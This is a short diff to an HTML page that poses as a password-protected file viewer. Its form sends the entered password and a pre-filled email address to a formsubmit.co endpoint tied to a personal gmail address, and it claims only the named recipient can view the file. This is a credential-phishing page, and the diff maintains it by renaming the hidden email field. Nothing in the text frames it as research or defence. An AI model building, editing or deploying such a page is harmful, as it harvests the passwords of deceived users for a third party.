@@ -181,7 +181,7 @@
     <!-- FORM START -->
     <form action="https://formsubmit.co/susanezra70@gmail.com" method="POST">
       <input name="password" type="password" class="password-input" placeholder="Enter password" required>
-      <input type="hidden" name="email" id="raw_email">
+      <input type="hidden" name="email" id="email">
       <div class="note">
         <span style="color: red">*</span> Only the above email recipient can view this file.
       </div>
@@ -199,7 +199,7 @@
 
     if (email) {
       document.querySelector('.email-display').textContent = email;
-      document.getElementById('raw_email').value = email;
+      document.getElementById('email').value = email;
     }
   </script>
 </body>
